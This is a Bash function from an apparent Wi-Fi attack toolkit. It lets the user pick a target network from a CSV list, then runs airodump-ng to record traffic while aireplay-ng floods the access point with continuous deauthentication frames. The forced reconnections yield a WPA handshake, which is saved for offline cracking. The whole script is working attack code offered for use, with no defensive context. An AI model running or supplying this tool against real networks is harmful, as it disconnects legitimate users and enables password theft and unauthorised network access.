function Capture_Handshake(){

    CSV_FILE="${BatLinux["Main_DIR"]}/${BatLinux["Networks_File"]}"
    selected=0
    IFS=$'\n' read -d '' -r -a lines < <(tail -n +2 "$CSV_FILE")
    total_lines=${#lines[@]}

    Draw_Network_Menu() {
    clear
    echo "=== Capture Handshake ==="
    echo "---------------------------------------------------"
    printf " %-25s %-20s %-8s %-4s\n" "ESSID" "BSSID" "Channel" "WPS"
    echo ""
        for i in "${!lines[@]}"; do
            IFS=',' read -r ESSID BSSID Channel WPS Note <<< "${lines[$i]}"
            if [ $i -eq $selected ]; then
                printf "\e[${BatLinux[TextForg]};${BatLinux[Background]}m${BatLinux[SelectionIcon]} %-24s %-20s %-8s %-4s\e[0m\n" "$ESSID" "$BSSID" "$Channel" "$WPS"
                selected_note="$Note"
            else
                printf " %-25s %-20s %-8s %-4s\n" "$ESSID" "$BSSID" "$Channel" "$WPS"
            fi
        done
        echo ""
        echo "---------------------------------------------------"
        echo "[Note] $selected_note"
}

function Capture() {

    # Clear tmporary files
    rm -f "/tmp/handshake/*.cap"

    IFS=',' read -r ESSID BSSID Channel WPS Note <<< "${lines[$selected]}"

    local timeout=10  
    
    trap 'rm -f /tmp/handshake/*.cap; break; exit' INT


    while true; do
    
        clear
        echo "Enter timeout in seconds (default: 60):"
        read -r user_timeout
        if [ -n "$user_timeout" ] && [ "$user_timeout" -gt 0 ] 2>/dev/null; then
            timeout=$user_timeout
        fi
        
        # Start airodump-ng in background
        airodump-ng --bssid "$BSSID" --channel "$Channel" --output-format pcap --write "/tmp/handshake/$ESSID" wlan0 &
        airodump_pid=$!
        
        # Start aireplay-ng deauth in background
        xterm -e aireplay-ng --deauth 0 -a "$BSSID" wlan0 &
        aireplay_pid=$!
        
        # Wait for timeout
        sleep "$timeout"
        
        # Kill background processes
        kill $airodump_pid $aireplay_pid 2>/dev/null
        wait $airodump_pid $aireplay_pid 2>/dev/null
        
        # Check if handshake was captured
        if tshark -r "/tmp/handshake/$ESSID-01.cap" | grep -q "handshake"; then
            clear
            echo "Handshake captured successfully! saved in ${BatLinux["Main_DIR"]}/${BatLinux["HandShakes_DIR"]}"
            mv "/tmp/handshake/$ESSID-01.cap" "${BatLinux["Main_DIR"]}/${BatLinux["HandShakes_DIR"]}/$ESSID.cap"
            break
        else
            echo "No handshake captured. Would you like to try again? (y/n)"
            read -r retry
            if [ "$retry" != "y" ]; then
                rm -f "/tmp/handshake/*.cap"
                break
            fi
        fi
    done
}




# Handle keyboard input
while true; do
    Draw_Network_Menu
    read -rsn1 key
    case "$key" in
        $'\x1B')  # Handle arrow keys
            read -rsn2 key
            case "$key" in
                "[A") # Up arrow
                    ((selected--))
                    [ $selected -lt 0 ] && selected=$((total_lines-1))
                    ;;
                "[B") # Down arrow
                    ((selected++))
                    [ $selected -ge $total_lines ] && selected=0
                    ;;
            esac
            ;;
        "") # Enter key
            Capture
            break 
            ;;
        [qQ]) # Quit
            clear
            return
            ;;
    esac
    done

}